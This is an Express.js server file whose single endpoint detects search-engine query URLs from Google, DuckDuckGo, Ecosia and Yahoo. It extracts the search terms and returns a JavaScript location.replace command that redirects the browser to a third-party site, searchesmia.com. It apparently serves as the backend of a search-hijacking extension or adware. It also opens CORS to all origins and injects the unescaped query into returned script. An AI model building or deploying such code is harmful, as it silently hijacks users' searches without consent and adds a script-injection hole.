var express = require('express');
var bodyParser = require('body-parser');
var app = express();
const cors = require('cors');

//Allow all requests from all domains & localhost
app.all('/*', function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "POST, GET");
    next();
});

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

function checkUrlIsSearchEngine(url) {
    if (url.match(/^https?:.*?google.*?\/search?/g) != null) {
        return getQuery(url);
    }
    if (url.match(/^https?:.*?duckduckgo.*?\/?q=/g) != null) {
        return getQuery(url);
    }
    if (url.match(/^https?:.*?ecosia.*?\/?search?/g) != null) {
        return getQuery(url);
    }
    if (url.match(/^https?:.*?yahoo.*?\/?search?/g) != null) {
        return getQuery(url, 'yahoo')
    }
}

function getQuery(search, type = '') {
    var pattern = type == 'yahoo' ? /[\?\&]p=(.*)&?/ : /[\?\&]q=(.*)&?/
    var result = pattern.exec(search) != null ? pattern.exec(search)[1] : ''
    var str = result
    if (type != 'yahoo') {
        str = result.split('&')[0] || ''
    }
    return str
}


app.get('/testing', function (req, res) {
    var query = req?.query.url || ''
    if(req && req.query && req.query.url) {
        query = req.query.url 
        var url = checkUrlIsSearchEngine(query)
        if (url) {
            res.send({ 'link': `location.replace("https://searchesmia.com/bingchr5?q=${url}")` });
        }
    }
    
});

app.listen(8080);
